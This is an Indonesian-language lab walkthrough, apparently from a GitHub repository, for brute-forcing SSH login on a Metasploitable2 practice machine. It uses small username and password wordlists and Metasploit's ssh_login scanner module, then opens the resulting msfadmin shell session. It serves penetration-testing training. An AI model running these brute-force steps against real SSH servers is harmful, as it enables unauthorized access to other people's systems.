# Exploit Port 22 (SSH)
- Buat file dengan nano yang berisi daftar user untuk uji coba
```sh
nano user-metasploitable2.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SSH/ssh%201.JPG)

- Isi file tersebut dengan daftar user sebagai berikut. Kemudian tekan `Ctrl+o` lalu `enter` untuk menyimpan
```sh
root
admin
msfadmin
administrator
guest
user
test
postgres
oracle
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SSH/ssh%202.JPG)

- Buat file dengan nano yang berisi daftar password untuk uji coba
```sh
nano password-metasploitable2.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SSH/ssh%203.JPG)

- Isi file tersebut dengan daftar password sebagai berikut. Kemudian tekan `Ctrl+O` lalu `enter` untuk menyimpan
```sh
qwerty
1234
admin
12345
msfadmin
123123
12345678
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SSH/ssh%204.JPG)

- Buka msfconsole di terminal
```sh
msfconsole
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SSH/ssh%205.JPG)

- Cari modul untuk exploit SSH
```sh
search ssh
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SSH/ssh%206.JPG)

- Gunakan modul `auxiliary/scanner/ssh/ssh_login` untuk brute force SSH login
```sh
use auxiliary/scanner/ssh/ssh_login
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SSH/ssh%207.JPG)

- Tampilkan daftar parameter yang dibutuhkan di modul tersebut
```sh
show options
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SSH/ssh%208.JPG)

- Isi parameter yang dibutuhkan di modul tersebut
```sh
set RHOST <IP_metasploitable2>
set VERBOSE true
set USER_FILE /home/kali/user-metasploitable2.txt
set PASS_FILE /home/kali/password-metasploitable2.txt
set STOP_ON_SUCCESS true
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SSH/ssh%209.JPG)

- Setelah pengisian parameter selesai jalankan proses brute force. Disini kita berhasil login ke SSH dengan username msfadmin password msfadmin yang berada di session 1
```sh
run
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SSH/ssh%2010.JPG)

- Akses session 1
```sh
sessions -i 1
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SSH/ssh%2011.JPG)

- Disini kita berhasil masuk sebagai user `msfadmin`

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SSH/ssh%2012.JPG)